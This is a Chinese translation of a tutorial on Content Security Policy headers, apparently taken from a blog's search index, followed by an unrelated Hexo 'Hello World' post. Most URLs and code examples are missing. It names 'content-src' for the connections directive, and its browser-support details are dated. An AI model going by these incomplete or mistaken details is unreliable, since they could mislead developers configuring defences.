CSP定义了Content-Security-PolicyHTTP头来允许你创建一个可信来源的白名单，使得浏览器只执行和渲染来自这些来源的资源，而不是盲目信任服务器提供的所有内容。即使攻击者可以找到漏洞来注入脚本，但是因为来源不包含在白名单里，因此将不会被执行。 以上面Google +1按钮为例，因为我们相信apis.google.com提供有效的代码，以及我们自己，所以可以定义一个策略，允许浏览器只会执行下面两个来源之一的脚本。 Content-Security-Policy:script-src ‘self’  是不是很简单？script-src可以为指定页面控制脚本相关权限。这样浏览器只会下载和执行来自和本页自身的脚本。 一旦我们定义了这个策略，浏览器会在检测到注入代码时抛出一个错误（请注意是什么浏览器）。 内容安全策略适用于所有常用资源 虽然脚本资源是最明显的安全隐患，但是CSP还提供了一套丰富的指令集，允许页面控制加载各种类型的资源，例如如下的类型： content-src：限制连接的类型（例如XHR、WebSockets和EventSource） font-src：控制网络字体的来源。例如可以通过font-src 来使用Google的网络字体。 frame-src：列出了可以嵌入的frame的来源。例如frame-src 只允许嵌入YouTube的视频。。 img-src：定义了可加载图像的来源。 media-src：限制视频和音频的来源。 object-src：限制Flash和其他插件的来源。 style-src：类似于Script-src，只是作用于css文件。 默认情况下，所有的设置都是打开的，不做任何限制。你可以以分号分隔多个指令，但是类似于script-src 的形式，第二个指令将会被忽略。正确的写法是script-src 。 例如，你有一个应用需要从内容分发网络（CDN，例如）加载所有的资源，并且知道不需要任何frame和插件的内容，你的策略可能会像下面这样： 细节 我在例子里使用的HTTP头是Content-Security-Policy，但是现代浏览器已经通过前缀来提供了支持：Firefox使用x-Content-Security-Policy，WebKit使用X-WebKit-CSP。未来会逐步过渡到统一的标准。 策略可以根据每个不同的页面而设定，这提供了很大的灵活度。因为你的站点可能有的页面有Google +1的按钮，而有的则没有。 每个指令的来源列表可以相当灵活，你可以指定模式（data:, https:），或者指定主机名在一个范围（example.com，它匹配主机上的任意来源、任意模式和任意端口），或者指定一个完整的URI（，特指https协议，example.com域名，443端口）。 你在来源列表中还可以使用四个关键字： “none”：你可能期望不匹配任何内容 “self”：与当前来源相同，但不包含子域 “unsafe-inline”：允许内联Javascript和CSS “unsafe-eval”：允许文本到JS的机制例如eval 请注意，这些关键词需要加引号。 沙箱 这里还有另外一个值得讨论的指令：sandbox。和其他指令有些不一致，它主要是控制页面上采取的行为，而不是页面能够加载的资源。如果设置了这个属性，页面就表现为一个设置了sandbox属性的frame一样。这对页面有很大范围的影响，例如防止表单提交等。这有点超出了本文的范围，但是你可以在HTML5规范的“沙箱标志设置”章节找到更多信息。 有害的内联代码 CSP基于来源白名单，但是它不能解决XSS攻击的最大来源：内联脚本注入。如果攻击者可以注入包含有害代码的script标签（），浏览器并没有好的机制来区分这个标签。CSP只能通过完全禁止内联脚本来解决这个问题。 这个禁止项不仅包括脚本中嵌入的script标签，还包括内联事件处理程序和javascrpt:这种URL。你需要把script标签的内容放到一个外部文件里，并且用适当的addEventListener的方式替换javascript:和&lt;a… onclick&#x3D;”[JAVASCRIPT]”&gt;。例如，你可能会把下面的表单： 重写为下面的形式： 无论是否使用CSP，以上的代码其实有更大的优点。内联JavaScript完全混合了结构和行为，你不应该这么做。另外外联资源更容易进行浏览器缓存，开发者更容易理解，并且便于编译和压缩。如果采用外联代码，你会写出更好的代码。 内联样式需要以同样的方式进行处理，无论是style属性还是style标签都需要提取到外部样式表中。这样可以防止各式各样神奇的数据泄漏方式。 如果你必须要有内联脚本和样式，可以为script-src or style-src属性设定’unsafe-inline值。但是不要这样做，禁止内联脚本是CSP提供的最大安全保证，同时禁止内联样式可以让你的应用变得更加安全和健壮。这是一个权衡，但是非常值得。 Eval 即便攻击者不能直接注入脚本，他可能会诱使你的应用把插入的文本转换为可执行脚本并且自我执行。eval() , newFunction() , setTimeout([string], …) 和setInterval([string], …) 都可能成为这种危险的载体。CSP针对这种风险的策略是，完全阻止这些载体。 这对你构建应用的方式有一些影响： 通过内置的JSON.parse解析JSON，而不依靠eval。IE8以后的浏览器都支持本地JSON操作，这是完全安全的。 通过内联函数代替字符串来重写你setTimeout和setInterval的调用方式。例如： 可以重写为： 避免运行时的内联模版：许多模版库都使用new Function()以加速模版的生成。这对动态程序来说非常棒，但是对恶意文本来说存在风险。 报告 CSP可以在服务器端阻止不可信的资源对用户来说非常有用，但是对于获取各种发送到服务器的通知来说对我们却非常有用，这样我们就能识别和修复任何恶意脚本注入。为此你可以通过report-uri指令指示浏览器发送JSON格式的拦截报告到某个地址。 报告看起来会像下面这样： 其中包含的信息会帮助你识别拦截的情况，包括拦截发生的页面（document-uri），页面的referrer，违反页面策略的资源（blocked-uri），所违反的指令（violated-directive）以及页面所有的内容安全策略（original-policy）。 现实用法 CSP现在在Chrome 16+和Firefox 4+的浏览器上可用，并且它在IE10上预计会获得有限的支持。Safari目前还不支持，但是WebKit每晚构建版已经可用，所以预计Safari将会在下面的迭代中提供支持。 下面让我们看一些常用的用例： 实际案例1：社会化媒体widget Google +1 button包括来自的脚本，以及嵌入自的iframe。你的策略需要包含这些源来使用Google +1的按钮。最简单的策略是script-src ; frame-src 。你还需要确保Google提供的JS片段存放在外部的JS文件里。 Facebook的Like按钮有许多种实现方案。我建议你坚持使用iframe版本，因为它可以和你站点的其它部分保持很好的隔离。这需要使用frame-src 指令。请注意，默认情况下，Facebook提供的iframe代码使用的是相对路径&#x2F;&#x2F;facebook.com，请把这段代码修改为，HTTP你没有必要可以不使用。 Twitter的Tweet按钮依赖于script和frame，都来自于（Twitter默认提供的是相对URL，请在复制的时候编辑代码来指定为HTTPS方式）。 其它的平台有相似的情况，可以类似的解决。我建议把default-src设置为none，然后查看控制台来检查你需要使用哪些资源来确保widget正常工作。 使用多个widget非常简单：只需要合并所有的策略指令，记住把同一指令的设置都放在一起。如果你想使用上面这三个widget，策略看起来会像下面这样： 实际案例2：防御 假设你访问一个银行网站，并且希望确保只加载你所需的资源。在这种情况下，开始设置一个默认的权限来阻止所有的内容（default-src ‘none’），并且从这从头构建策略。 比如，银行网站需要从来自的CDN加载图像、样式和脚本，并且通过XHR连接到来拉取各种数据，还需要使用frame，但是frame都来自非第三方的本地页面。网站上没有Flash、字体和其他内容。这种情况下我们可以发送最严格的CSP头是： 实际案例3：只用SSL 一个婚戒论坛管理员希望所有的资源都通过安全的方式进行加载，但是不想真的编写太多代码；重写大量第三方论坛内联脚本和样式的代码超出了他的能力。所以以下的策略将会是非常有用的： 尽管default-src指定了https，脚本和样式不会自动继承。每个指令将会完全覆盖默认资源类型。 未来 W3C的Web应用安全工作组正在制定内容安全策略规范的细节，1.0版本将要进入最后修订阶段，它和本文描述的内容已经非常接近。而public-webappsec@邮件组正在讨论1.1版本，浏览器厂商也在努力巩固和改进CSP的实现。 CSP 1.1在画板上有一些有趣的地方，值得单独列出来： 通过meta标签添加策略：CSP的首选设置方式是HTTP头，它非常有用，但是通过标记或者脚本设置会更加直接，不过目前还未最终确定。WebKit已经实现了通过meta元素进行权限设置的特性，所以你现在可以在Chrome下尝试如下的设置：在文档头添加&lt;metahttp-equiv&#x3D;”X-WebKit-CSP” content&#x3D;”[POLICY GOES HERE]”&gt;。 你甚至可以在运行时通过脚本来添加策略。 DOM API：如果CSP的下一个迭代添加了这个特性，你可以通过Javascript来查询页面当前的安全策略，并根据不同的情况进行调整。例如在eval()是否可用的情况下，你的代码实现可能会有些许不同。这对JS框架的作者来说非常有用；并且API规范目前还非常不确定，你可以在规范草案的脚本接口章节找到最新的迭代版本。** 新的指令：许多新指令正在讨论中，包括script-nonce：只有明确指定的脚本元素才能使用内联脚本；plugin-types：这将限制插件的类型；form-action：允许form只能提交到特定的来源。"},{"title":"Hello World","date":"2023-07-30T09:48:42.100Z","url":"/2023/07/30/hello-world/","categories":[["undefined",""]],"content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post More info: Writing Run server More info: Server Generate static files More info: Generating Deploy to remote sites More info: Deployment"}]